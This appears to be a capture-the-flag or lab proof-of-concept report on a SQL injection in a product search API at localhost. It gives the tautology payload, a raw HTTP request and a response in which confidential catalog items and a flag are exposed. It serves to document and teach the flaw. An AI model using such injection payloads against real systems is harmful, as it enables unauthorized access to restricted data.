# Proof of Concept: Query String Injection in Product Catalog (OWASP A03:2021)

**Vulnerability Type:** Injection (SQL / Query String Interpolation)  
**Affected Component:** `/api/products/search?q={searchTerm}`  
**Severity:** HIGH (CVSS 8.2 - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Target:** `http://127.0.0.1:3000/api/products/search?q=' OR '1'='1`  

## 1. Technical Vulnerability Description
The search endpoint constructs datastore query filters through direct string concatenation without input sanitization or parameter binding. An attacker supplying boolean tautologies (e.g. `' OR '1'='1`) manipulates query logic to bypass the `isPublic = true` visibility filter.

## 2. Reproduction Steps
1. Execute a GET request with payload `' OR '1'='1` in the query parameter `q`.
2. Observe that restricted items (`isPublic: false`) such as confidential internal toolkits are exposed.

## 3. Raw HTTP Request
```http
GET /api/products/search?q='%20OR%20'1'='1 HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: SecurityAudit-HarmlessProbe/1.0
Accept: application/json
```

## 4. Sanitized HTTP Response Evidence
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "query": "' OR '1'='1",
  "simulatedQuery": "SELECT * FROM products WHERE isPublic = 1 AND name LIKE '%' OR '1'='1%'",
  "count": 5,
  "injected": true,
  "data": [
    {
      "id": 104,
      "name": "Internal Red-Team Assessment Toolkit [CONFIDENTIAL]",
      "category": "Restricted",
      "price": 999,
      "isPublic": false,
      "stock": 2,
      "internalNotes": "RESTRICTED: Internal staff tool only. Flag: FLAG{sql_inj_unreleased_data_leak}"
    }
  ]
}
```

## 5. Security Impact
Exposure of unreleased, internal-only, proprietary, or confidential catalog entries, intellectual property leakage, and potential database compromise.
